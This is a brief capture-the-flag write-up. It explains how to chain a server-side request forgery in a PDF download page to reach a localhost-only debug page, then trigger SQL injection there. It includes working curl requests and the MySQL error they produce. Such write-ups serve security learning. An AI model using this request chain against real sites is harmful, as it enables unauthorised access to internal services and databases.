This challenge is a sql injection to a local debugging page using SSRF

- Try directory listing on /secure, find debug.php, which doesn't allow your IP (probably a localhost only debug page)
- Find the download.php page
    o Notice that it appends .pdf to the end, but nothing to start
    o You can SSRF using download.php?dl=http://example.com/?
        o Even though it sets a 404 and complains it can't find it, it still reads the url anyway
        o This will request http://example.com/?.pdf
- We can now request debug.php from localhost
    - Make a request to download http://127.0.0.1/secure/debug.php
        $ curl 'http://kansas.pwn.republican/download.php?dl=http://127.0.0.1/secure/debug.php?'
    - It has the same html, but if you poke around with the parameters from default.php, you notice it has an SQLi
        $ curl 'http://kansas.pwn.republican/download.php?dl=http://127.0.0.1/secure/debug.php?s=3%26txtfirst_name=123%26txtmiddle_name=123%26txtname_suffix=asdf%26txtLast_name=asdf%26txtdob=12%271%26txtdl_nmbr=asdf%26txtRetypeDL=asdf%26'
        Please report the error to the sysadmin...You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1','asdf')' at line 1

- You can now do an sql injection to dump the flag from the secrets table

